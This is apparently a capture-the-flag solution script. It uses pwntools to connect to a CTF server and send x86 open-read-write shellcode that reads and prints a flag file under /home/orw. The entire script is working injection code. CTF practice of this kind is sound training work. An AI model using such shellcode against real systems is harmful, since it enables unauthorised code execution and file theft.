from pwn import *

host = 'csie.ctf.tw'
port = 10134
y = remote( host , port )
#y = process('orw-82522ef3c2837222ae6b1a44434666c8')

buf = 0x0804a107

_asm = """
    xor edx , edx
    xor ecx , ecx
    push ecx
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov ebx , esp
    mov eax , 0x5
    int 0x80

    mov ebx , eax
    mov ecx , 0x0804a107
    mov edx , 0x25
    mov eax , 0x3
    int 0x80

    mov ebx , 0x1
    mov ecx , 0x0804a107
    mov edx , 0x25
    mov eax , 0x4
    int 0x80
"""

shellcode = asm(_asm)
y.sendline(shellcode)
y.interactive()
